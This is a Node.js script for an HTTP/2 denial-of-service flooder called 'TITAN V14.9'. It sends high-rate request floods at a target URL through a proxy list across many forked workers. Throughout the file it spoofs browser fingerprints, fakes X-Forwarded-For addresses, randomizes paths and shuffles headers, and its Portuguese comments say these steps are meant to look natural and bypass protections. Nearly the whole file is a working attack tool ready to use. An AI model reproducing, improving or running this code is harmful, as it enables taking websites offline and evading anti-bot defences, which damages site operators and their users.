const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const crypto = require("crypto");
const fs = require("fs");
const url = require("url");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

const args = { 
    target: process.argv[2], 
    time: ~~process.argv[3], 
    rate: ~~process.argv[4], 
    threads: ~~process.argv[5],
    proxyFile: process.argv[6] || "proxy.txt"
};

const parsedTarget = url.parse(args.target);
const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(l => l.length > 5);
const userAgents = fs.readFileSync("ua.txt", "utf-8").split(/\r?\n/).filter(l => l.length > 10);
const selfReferer = `${parsedTarget.protocol}//${parsedTarget.host}/`;

// ===== INÍCIO DO BLOCO IMPORTADO DO bypass.js =====
function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function randstr(length) {
    const characters = "0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];

const getRandomBrowser = () => {
    const randomIndex = Math.floor(Math.random() * browsers.length);
    return browsers[randomIndex];
};

const h2Settings = (browser) => {
    const settings = {
        brave: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        chrome: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 1000],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        firefox: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        mobile: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        opera: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        operagx: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        safari: [
            ["SETTINGS_HEADER_TABLE_SIZE", 4096],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 100],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ],
        duckduckgo: [
            ["SETTINGS_HEADER_TABLE_SIZE", 65536],
            ["SETTINGS_ENABLE_PUSH", false],
            ["SETTINGS_MAX_CONCURRENT_STREAMS", 500],
            ["SETTINGS_INITIAL_WINDOW_SIZE", 6291456],
            ["SETTINGS_MAX_FRAME_SIZE", 16384],
            ["SETTINGS_MAX_HEADER_LIST_SIZE", 262144]
        ]
    };
    return Object.fromEntries(settings[browser]);
};

const generateHeaders = (browser) => {
    const versions = {
        chrome: { min: 115, max: 124 },
        safari: { min: 14, max: 16 },
        brave: { min: 115, max: 124 },
        firefox: { min: 99, max: 112 },
        mobile: { min: 85, max: 105 },
        opera: { min: 70, max: 90 },
        operagx: { min: 70, max: 90 },
        duckduckgo: { min: 12, max: 16 }
    };

    const fullVersions = {
        brave: "90.0.4430.212",
        chrome: "90.0.4430.212",
        firefox: "88.0",
        safari: "14.1",
        mobile: "90.0.4430.212",
        opera: "90.0.4430.212",
        operagx: "90.0.4430.212",
        duckduckgo: "7.0"
    };

    const platforms = {
        chrome: "Win64",
        safari: "macOS",
        brave: "Linux",
        firefox: "Linux",
        mobile: "Android",
        opera: "Linux",
        operagx: "Linux",
        duckduckgo: "macOS"
    };
    const platform = platforms[browser];

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Brave";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(115 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "6.1" : "10.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://brave.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Safari";v="${Math.floor(115 + Math.random() * 10)}", "AppleWebKit";v="${Math.floor(537 + Math.random() * 20)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "macOS" : "iOS",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Macintosh; Intel Mac OS X ${Math.random() < 0.5 ? "10_14_6" : "10_15_7"}) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(13 + Math.random() * 10)}.${Math.floor(Math.random() * 10)} Safari/537.36`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.apple.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Linux; Android ${Math.floor(9 + Math.random() * 5)}.${Math.floor(Math.random() * 10)}; Mobile; rv:${Math.floor(60 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://m.example.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(70 + Math.random() * 10)}", "Gecko";v="20100101", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64; rv:${Math.floor(70 + Math.random() * 10)}) Gecko/20100101 Firefox/${Math.floor(70 + Math.random() * 10)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.mozilla.org/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera";v="${Math.floor(75 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Linux",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "6.1"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(75 + Math.random() * 10)}.0.0.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        operagx: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera GX";v="${Math.floor(80 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "accept": `text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8, application/json;q=0.5`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 OPR/${Math.floor(80 + Math.random() * 10)}.0.0.0 GX`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://www.opera.com/gx",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        },
        duckduckgo: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 
                ? parsedTarget.host + (Math.random() < 0.5 ? "." : "") 
                : "www." + parsedTarget.host + (Math.random() < 0.5 ? "." : ""),
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"DuckDuckGo";v="${Math.floor(115 + Math.random() * 10)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": Math.random() < 0.5 ? "Windows" : "Android",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "user-agent": `Mozilla/5.0 (${Math.random() < 0.5 ? "Windows NT 10.0; Win64; x64" : "Linux; Android 11"}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 DuckDuckGo/${Math.floor(10 + Math.random() * 5)}.0`,
            "accept-language": Math.random() < 0.5 ? "en-US,en;q=0.9" : "id-ID,id;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "referer": Math.random() < 0.5 ? "https://www.google.com/" : "https://duckduckgo.com/",
            "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "dnt": "1",
            "upgrade-insecure-requests": "1",
            "cache-control": "max-age=0"
        }
    };

    return headersMap[browser];
};

function shuffleHeaders(obj) {
    const keys = Object.keys(obj);
    for (let i = keys.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [keys[i], keys[j]] = [keys[j], keys[i]];
    }
    const shuffled = {};
    keys.forEach(key => shuffled[key] = obj[key]);
    return shuffled;
}

function getWeightedRandom() {
    const randomValue = Math.random() * Math.random();
    return randomValue < 0.25;
}
// ===== FIM DO BLOCO IMPORTADO DO bypass.js =====

function format(n) {
    if (n >= 1e9) return (n / 1e9).toFixed(1) + 'B';
    if (n >= 1e6) return (n / 1e6).toFixed(1) + 'M';
    if (n >= 1e3) return (n / 1e3).toFixed(1) + 'K';
    return n;
}

if (cluster.isMaster) {
    console.clear();
    let totalSent = 0, rps = 0;
    const codes = {}, proxyHits = {}, onlineProxies = new Set();

    for (let i = 0; i < args.threads; i++) cluster.fork();

    setInterval(() => {
        console.clear();
        console.log(`\n\x1b[1;37m  \x1b[42m NFU \x1b[0m \x1b[1;32mTITAN V14.9 \x1b[1;30m| \x1b[1;37m[MAX POTENCY MODE]\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        process.stdout.write(`\x1b[1;37m  SENT: \x1b[1;32m${format(totalSent).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  RPS: \x1b[1;32m${format(rps).padEnd(8)}\x1b[0m`);
        process.stdout.write(`\x1b[1;37m  TARGET: \x1b[1;36m${parsedTarget.host}\x1b[0m\n`);
        
        let st = Object.entries(codes).sort((a,b) => b[1]-a[1]).slice(0, 4).map(([c,v]) => {
            let color = c == "403" ? "\x1b[1;31m" : (c == "200" ? "\x1b[1;32m" : "\x1b[1;33m");
            return `${color}${c}\x1b[1;37m:${format(v)}`;
        }).join(' \x1b[1;30m| ');
        
        console.log(`\x1b[1;37m  STATUS: ${st || '\x1b[1;30mMoendo...'}\x1b[0m`);
        console.log(`\x1b[1;37m  PROXIES ONLINE: \x1b[1;32m${onlineProxies.size}\x1b[0m`);
        console.log(`\x1b[1;30m  ──────────────────────────────────────────────────\x1b[0m`);
        
        Object.entries(proxyHits).sort((a,b) => b[1]-a[1]).slice(0, 3).forEach(([ip, count]) => {
            console.log(`  \x1b[1;30m> \x1b[1;32m${ip.padEnd(15)}\x1b[1;30m ─ \x1b[1;37mHITS: \x1b[1;32m${format(count)}\x1b[0m`);
        });
        
        rps = 0;
    }, 1000);

    cluster.on('message', (worker, msg) => {
        if (msg.type === 'batch') {
            totalSent += msg.c; rps += msg.c;
            if (msg.ip) {
                onlineProxies.add(msg.ip);
                proxyHits[msg.ip] = (proxyHits[msg.ip] || 0) + msg.c;
            }
            Object.keys(msg.codes).forEach(c => { codes[c] = (codes[c] || 0) + msg.codes[c]; });
        }
    });
    setTimeout(() => process.exit(1), args.time * 1000);
} else {
    for (let i = 0; i < 15; i++) setInterval(runFlooder, 0);
}

function runFlooder() {
    const proxyRaw = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyRaw) return;
    const [pHost, pPort] = proxyRaw.split(':');

    const socket = net.connect({ host: pHost, port: parseInt(pPort) });
    socket.setNoDelay(true);
    socket.setKeepAlive(true, 60000);

    socket.once("connect", () => {
        socket.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\n\r\n`);
    });

    socket.once("data", (d) => {
        if (!d.toString().includes("200")) return socket.destroy();
        
        const tlsConn = tls.connect({
            socket: socket, servername: parsedTarget.host,
            ALPNProtocols: ["h2"], rejectUnauthorized: false,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256",
        }, () => {
            const client = http2.connect(parsedTarget.href, {
                createConnection: () => tlsConn,
                settings: { 
                    initialWindowSize: 2147483647,
                    maxConcurrentStreams: 10000,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                let bCount = 0; let bCodes = {};
                const flood = setInterval(() => {
                    if (!client || client.destroyed) return clearInterval(flood);
                    for (let i = 0; i < args.rate; i++) {
                        // ===== USANDO OS HEADERS DINÂMICOS DO bypass.js =====
                        const browser = getRandomBrowser();
                        let headers = generateHeaders(browser);
                        
                        // Adiciona headers extras aleatórios como no bypass.js
                        const randomString = randstr(10);
                        const extraHeaders = {
                            ...(getWeightedRandom() && Math.random() < 0.4 && { 'x-forwarded-for': `${randomString}:${randomString}` }),
                            ...(getWeightedRandom() && { 'referer': `https://${randomString}.com` })
                        };
                        Object.assign(headers, extraHeaders);
                        
                        // Embaralha os headers para parecer mais natural
                        const finalHeaders = shuffleHeaders(headers);
                        // ===== FIM DOS HEADERS DINÂMICOS =====

                        const req = client.request(finalHeaders);
                        req.on("response", (res) => {
                            const sc = res[":status"];
                            bCount++; bCodes[sc] = (bCodes[sc] || 0) + 1;
                            if (bCount >= 100) {
                                process.send({ type: 'batch', c: bCount, codes: bCodes, ip: pHost });
                                bCount = 0; bCodes = {};
                            }
                            req.close(); req.destroy();
                        });
                        req.end();
                    }
                }, 100);
                setTimeout(() => { client.destroy(); socket.destroy(); }, 20000);
            });
            client.on("error", () => socket.destroy());
        });
    });
    socket.on("error", () => socket.destroy());
}